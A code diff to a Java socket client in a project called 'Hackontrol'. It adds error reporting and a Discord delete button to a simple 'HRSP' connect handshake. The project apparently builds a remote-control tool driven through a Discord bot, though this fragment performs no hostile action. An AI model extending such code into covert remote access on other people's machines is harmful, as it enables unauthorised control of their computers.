@@ -6,6 +6,11 @@ import java.net.Socket;
 import java.nio.charset.StandardCharsets;
 import java.util.function.Consumer;
 
+import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.interaction.HackontrolButton;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
+
+import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
 import net.dv8tion.jda.api.utils.messages.MessageCreateData;
 
 public class HRSPClient {
@@ -14,14 +19,15 @@ public class HRSPClient {
 		OutputStream outputStream = socket.getOutputStream();
 		outputStream.write("HRSP 1.0 CONNECT".getBytes(StandardCharsets.UTF_8));
 		InputStream inputStream = socket.getInputStream();
-		byte[] data = inputStream.readNBytes(11);
+		String response = new String(inputStream.readNBytes(11), StandardCharsets.UTF_8);
 
-		if(!"HRSP 1.0 OK".equals(new String(data, StandardCharsets.UTF_8))) {
+		if(!"HRSP 1.0 OK".equals(response)) {
+			HackontrolError.message(ConsumerMessageCreateDataSendable.of(consumer), "Invalid response: " + response);
 			socket.close();
 			return;
 		}
 
-		consumer.accept(MessageCreateData.fromContent("**Connected**"));
+		consumer.accept(new MessageCreateBuilder().setContent("**Connected**").addActionRow(HackontrolButton.delete()).build());
 		socket.close();
 	}
 }
